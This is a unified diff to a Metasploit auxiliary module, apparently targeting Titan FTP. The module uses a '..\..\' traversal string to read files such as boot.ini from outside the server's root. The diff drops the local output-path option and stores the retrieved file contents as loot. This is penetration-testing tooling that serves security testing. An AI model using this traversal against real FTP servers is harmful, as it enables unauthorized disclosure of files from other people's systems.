@@ -5,8 +5,8 @@
 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -14,6 +14,7 @@ require 'msf/core'
 class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Exploit::Remote::Ftp
+	include Msf::Auxiliary::Report
 
 	def proto
 		'ftp'
@@ -48,8 +49,7 @@ class Metasploit3 < Msf::Auxiliary
 			[
 				Opt::RPORT(21),
 				OptString.new('TRAVERSAL', [ true, "String to traverse to the drive's root directory", "..\\..\\" ]),
-				OptString.new('PATH', [ true, "Path to the file to disclose, releative to the root dir.", 'boot.ini']),
-				OptString.new('OUTPUTPATH', [ false, "Local path to save the file contents to", nil ])
+				OptString.new('PATH', [ true, "Path to the file to disclose, releative to the root dir.", 'boot.ini'])
 			], self.class)
 	end
 
@@ -99,17 +99,9 @@ class Metasploit3 < Msf::Auxiliary
 
 		progress(file_size, file_size)
 
-		if (datastore['OUTPUTPATH'])
-			fname = datastore['PATH'].gsub(/[\/\\]/, '_')
-			outpath = File.join(datastore['OUTPUTPATH'], fname)
-			print_status("Saving contents to #{outpath} ...")
-			File.open(outpath, "wb") { |fd|
-				fd.write(file_data)
-			}
-		else
-			print_status("File contents:")
-			print_status(file_data.inspect)
-		end
+		fname = datastore['PATH'].gsub(/[\/\\]/, '_')
+		p = store_loot("titanftp.traversal", "text/plain", "rhost", file_data, fname)
+		vprint_status(file_data.inspect)
 
 		disconnect
 
